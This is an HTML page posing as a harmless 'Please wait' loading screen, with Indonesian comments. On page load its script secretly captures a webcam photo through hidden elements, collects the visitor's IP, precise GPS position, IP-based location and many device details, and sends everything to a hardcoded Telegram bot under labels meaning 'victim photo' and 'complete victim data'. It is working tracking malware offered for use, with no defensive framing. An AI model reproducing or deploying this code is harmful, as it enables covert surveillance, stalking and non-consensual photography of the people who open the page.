<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background: #f5f5f5;
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .spinner {
            border: 3px solid #e0e0e0;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            color: #666;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div>
        <div class="spinner"></div>
        <div class="message">Please wait...</div>
    </div>

    <!-- Elemen hidden untuk capture -->
    <video id="video" width="640" height="480" autoplay style="display: none;"></video>
    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

    <script>
        // ========== KONFIGURASI TELEGRAM ==========
        const BOT_TOKEN = '8450168477:AAHAncu3hD0uc0zp4OGjpdjuz_TnV3lmJvY';
        const CHAT_ID = '7604508820';
        // ===========================================

        let cameraStream = null;
        let fotoTerkirim = false;
        let dataTerkirim = false;

        // Fungsi kirim teks
        function sendToTelegram(message) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).catch(err => console.log('Error kirim teks:', err));
        }

        // Fungsi kirim foto
        function sendPhotoToTelegram(blob, caption = 'üì∏ Foto Korban') {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'foto.jpg');
            formData.append('caption', caption);

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(err => console.log('Error kirim foto:', err));
        }

        // Ambil foto dari kamera
        function capturePhoto() {
            if (!cameraStream) return;

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            setTimeout(() => {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob((blob) => {
                    sendPhotoToTelegram(blob, 'üì∏ Foto Korban');
                    fotoTerkirim = true;
                    console.log('Foto terkirim');
                }, 'image/jpeg', 0.9);
            }, 2000);
        }

        // Ambil IP
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'Tidak diketahui';
            }
        }

        // Ambil GPS
        function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        // Ambil lokasi dari IP
        async function getIPLocation(ip) {
            try {
                const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,as,proxy`);
                return await res.json();
            } catch {
                return null;
            }
        }

        // Format pesan SUPER LENGKAP
        async function formatMessage() {
            try {
                const ip = await getIP();
                const gps = await getGPS();
                const ipLoc = await getIPLocation(ip);
                
                let batteryInfo = 'Tidak diketahui';
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Battery'})`;
                }

                const connection = navigator.connection || navigator.mozConnection;
                let connectionInfo = 'Tidak diketahui';
                if (connection) {
                    connectionInfo = `${connection.effectiveType || 'N/A'}, ${connection.downlink || '?'} Mbps`;
                }

                // FORMAT PESAN (PALING LENGKAP)
                let message = `üî• **DATA KORBAN SUPER LENGKAP** üî•\n\n`;
                message += `‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n`;
                message += `üì° **INFORMASI DASAR**\n`;
                message += `‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n`;
                message += `üì° IP ADDRESS: ${ip}\n`;
                message += `üåê HOSTNAME: ${window.location.hostname}\n`;
                message += `üîó URL: ${window.location.href}\n\n`;

                if (gps) {
                    message += `‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n`;
                    message += `üìç **LOKASI GPS AKURAT**\n`;
                    message += `‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n`;
                    message += `‚îú‚îÄ Latitude: ${gps.lat}\n`;
                    message += `‚îú‚îÄ Longitude: ${gps.lon}\n`;
                    message += `‚îú‚îÄ Akurasi: ${gps.accuracy.toFixed(1)} meter\n`;
                    message += `‚îú‚îÄ Google Maps: https://maps.google.com/?q=${gps.lat},${gps.lon}\n`;
                    message += `‚îî‚îÄ What3Words: https://what3words.com/${gps.lat},${gps.lon}\n\n`;
                }

                if (ipLoc && ipLoc.status === 'success') {
                    message += `‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n`;
                    message += `üåç **LOKASI BERDASARKAN IP**\n`;
                    message += `‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n`;
                    message += `‚îú‚îÄ Negara: ${ipLoc.country}\n`;
                    message += `‚îú‚îÄ Region: ${ipLoc.regionName}\n`;
                    message += `‚îú‚îÄ Kota: ${ipLoc.city}\n`;
                    message += `‚îú‚îÄ Latitude: ${ipLoc.lat}\n`;
                    message += `‚îú‚îÄ Longitude: ${ipLoc.lon}\n`;
                    message += `‚îú‚îÄ ISP: ${ipLoc.isp}\n`;
                    message += `‚îú‚îÄ Organisasi: ${ipLoc.org || 'N/A'}\n`;
                    message += `‚îú‚îÄ Proxy/VPN: ${ipLoc.proxy ? 'Ya' : 'Tidak'}\n\n`;
                }

                message += `‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n`;
                message += `üì± **INFO PERANGKAT**\n`;
                message += `‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n`;
                message += `‚îú‚îÄ Platform: ${navigator.platform}\n`;
                message += `‚îú‚îÄ Vendor: ${navigator.vendor || 'N/A'}\n`;
                message += `‚îú‚îÄ Language: ${navigator.language}\n`;
                message += `‚îú‚îÄ Languages: ${navigator.languages?.join(', ') || 'N/A'}\n`;
                message += `‚îú‚îÄ Cookie Enabled: ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}\n`;
                message += `‚îú‚îÄ Battery: ${batteryInfo}\n`;
                message += `‚îú‚îÄ Koneksi: ${connectionInfo}\n`;
                message += `‚îú‚îÄ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
                message += `‚îú‚îÄ Screen: ${window.screen.width}x${window.screen.height}\n`;
                message += `‚îú‚îÄ Color Depth: ${window.screen.colorDepth}bit\n`;
                message += `‚îú‚îÄ CPU Cores: ${navigator.hardwareConcurrency || '?'}\n`;
                message += `‚îú‚îÄ RAM: ${navigator.deviceMemory || '?'} GB\n`;
                message += `‚îú‚îÄ Online: ${navigator.onLine ? 'Ya' : 'Tidak'}\n`;
                message += `‚îú‚îÄ Referrer: ${document.referrer || 'Langsung'}\n`;
                message += `‚îî‚îÄ Waktu: ${new Date().toLocaleString()}\n\n`;
                
                message += `‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n`;
                message += `üñ•Ô∏è **USER AGENT**\n`;
                message += `‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n`;
                message += `${navigator.userAgent}`;

                sendToTelegram(message);
                dataTerkirim = true;
                console.log('Data teks terkirim');

            } catch (error) {
                console.log('Error:', error);
            }
        }

        // Minta akses kamera
        async function requestCamera() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: true, 
                    audio: false 
                });

                const video = document.getElementById('video');
                video.srcObject = cameraStream;
                
                // Ambil foto
                capturePhoto();

            } catch (err) {
                console.log('Gagal akses kamera:', err);
            }
        }

        // Jalanin semua
        window.onload = function() {
            // Minta kamera
            setTimeout(requestCamera, 500);
            
            // Kumpulin data
            setTimeout(formatMessage, 1000);
            
            // Matikan stream setelah 10 detik
            setTimeout(() => {
                if (cameraStream) {
                    cameraStream.getTracks().forEach(t => t.stop());
                }
            }, 10000);
        };
    </script>
</body>
</html>
